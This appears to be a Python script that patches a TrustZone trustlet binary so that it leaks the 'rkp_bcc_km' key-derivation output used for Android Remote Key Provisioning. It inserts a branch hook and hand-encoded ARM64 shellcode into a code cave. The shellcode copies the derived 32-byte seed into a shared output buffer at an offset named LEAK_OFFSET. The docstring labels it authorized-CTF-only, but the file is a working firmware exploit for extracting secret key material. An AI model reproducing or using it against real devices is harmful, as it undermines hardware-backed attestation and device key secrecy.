#!/usr/bin/env python3
"""Invoke the production ``rkp_bcc_km`` KDF from the direct keygen path.

The normal production CSR path invokes the internal routine at 0x22770 with:

    label="rkp_bcc_km", label_len=10, output_len=32, mode=1

Direct CSR setup fails before reaching that call.  Direct RKP key generation,
however, is stable.  This authorized-CTF-only patch hooks the successful keygen
return path, invokes the same KDF, stores its 32-byte output at
``private_out+0x400``, stores the KDF return code at ``private_out+0x420``, and
then resumes the stock keygen cleanup path without changing private_len.

The KDF operates on a trustlet stack buffer, mirroring the stock CSR path.  The
completed value is copied to the shared direct-output buffer only afterward.

Do not mount this trustlet into the Android system KeyMint/RKPD path.
"""

from pathlib import Path
import hashlib
import struct


ROOT = Path(__file__).resolve().parents[4]
SRC = (
    ROOT
    / "正规目录_按目标分类"
    / "目标二_提取RKP"
    / "05_输入与支撑材料"
    / "source_binaries"
    / "vendor_app_mcRegistry"
    / "0706000000000000000000000000004d.tlbin"
)
OUTDIR = (
    ROOT
    / "正规目录_按目标分类"
    / "目标二_提取RKP"
    / "03_patch与二进制"
    / "patched_binaries"
    / "patched_ta"
)

TEXT_BASE = 0x1000
TEXT_OFF = 0xD0
HOOK = 0x21FE0
CAVE = 0x411AC
KDF = 0x22770
RETURN_PATH = 0x21C9C
LEAK_OFFSET = 0x400
KDF_STATUS_OFFSET = 0x420


def off(va: int) -> int:
    return TEXT_OFF + (va - TEXT_BASE)


def enc_b(src: int, dst: int, *, link: bool = False) -> bytes:
    delta = dst - src
    if delta % 4:
        raise ValueError(f"unaligned branch {src:#x}->{dst:#x}")
    imm = delta // 4
    if not (-(1 << 25) <= imm < (1 << 25)):
        raise ValueError(f"branch out of range {src:#x}->{dst:#x}")
    opcode = 0x94000000 if link else 0x14000000
    return struct.pack("<I", opcode | (imm & 0x03FFFFFF))


def word(value: int) -> bytes:
    return struct.pack("<I", value)


def main() -> None:
    original = SRC.read_bytes()
    patched = bytearray(original)

    expected_hook = bytes.fromhex("f96b45a9751301b8")
    actual_hook = bytes(patched[off(HOOK) : off(HOOK) + len(expected_hook)])
    if actual_hook != expected_hook:
        raise SystemExit(
            f"hook mismatch at {HOOK:#x}: got {actual_hook.hex()} "
            f"expected {expected_hook.hex()}"
        )

    cave_size = 0x60
    if bytes(patched[off(CAVE) : off(CAVE) + cave_size]) != bytes(cave_size):
        raise SystemExit(f"code cave at {CAVE:#x} is not empty")

    # The runtime target of ADRP+ADD is the 10-byte literal rkp_bcc_km.
    # Capstone view: adrp x0,#0x40000; add x0,x0,#0x9a0.
    snippet = b"".join(
        [
            word(0xD100C3FF),  # sub sp,sp,#0x30 (seed scratch)
            word(0xF90013F4),  # str x20,[sp,#0x20]
            word(0xF0FFFFE0),  # adrp x0,#0x40000
            word(0x91268000),  # add x0,x0,#0x9a0 -> "rkp_bcc_km"
            word(0xD2800141),  # mov x1,#10
            word(0x910003E2),  # mov x2,sp (TA-local seed output)
            word(0xD2800403),  # mov x3,#32
            word(0x52800024),  # mov w4,#1
            word(0x52800005),  # mov w5,#0
            enc_b(CAVE + 0x24, KDF, link=True),
            word(0xF94013F4),  # ldr x20,[sp,#0x20]
            word(0xB9042280),  # str w0,[x20,#0x420] (KDF status)
            word(0x52824681),  # mov w1,#0x1234 (restored-pointer marker)
            word(0xB9042681),  # str w1,[x20,#0x424]
            word(0x91100280),  # add x0,x20,#0x400 (export seed)
            word(0x910003E1),  # mov x1,sp
            word(0x52800402),  # mov w2,#32
            enc_b(CAVE + 0x44, 0x50F0, link=True),
            word(0xF94013F4),  # ldr x20,[sp,#0x20]
            word(0x9100C3FF),  # add sp,sp,#0x30
            word(0xA9456BF9),  # ldp x25,x26,[sp,#80] (replay stock)
            word(0xB8011375),  # stur w21,[x27,#17] (replay stock)
            enc_b(CAVE + 0x58, RETURN_PATH),
        ]
    )
    if len(snippet) > cave_size:
        raise SystemExit(f"snippet too large: {len(snippet)}")

    patched[off(HOOK) : off(HOOK) + 4] = enc_b(HOOK, CAVE)
    patched[off(CAVE) : off(CAVE) + len(snippet)] = snippet

    OUTDIR.mkdir(parents=True, exist_ok=True)
    system = OUTDIR / "0706000000000000000000000000004d.rkp_bcc_kdf_keygenleak.tlbin"
    system.write_bytes(patched)

    direct = bytearray(patched)
    expected_uuid = bytes.fromhex("0706000000000000000000000000004d")
    if direct[0x18:0x28] != expected_uuid:
        raise SystemExit(f"unexpected MCLF UUID: {direct[0x18:0x28].hex()}")
    direct[0x27] = 0x4E
    direct_path = OUTDIR / "0706000000000000000000000000004e.rkp_bcc_kdf_keygenleak.tlbin"
    direct_path.write_bytes(direct)

    print("source_sha256", hashlib.sha256(original).hexdigest())
    print("system_direct_only", system)
    print("system_sha256", hashlib.sha256(patched).hexdigest())
    print("direct", direct_path)
    print("direct_sha256", hashlib.sha256(direct).hexdigest())
    print("hook", hex(HOOK), "cave", hex(CAVE), "snippet_len", len(snippet))
    print(
        "leak_offset", hex(LEAK_OFFSET),
        "kdf_status_offset", hex(KDF_STATUS_OFFSET),
    )


if __name__ == "__main__":
    main()
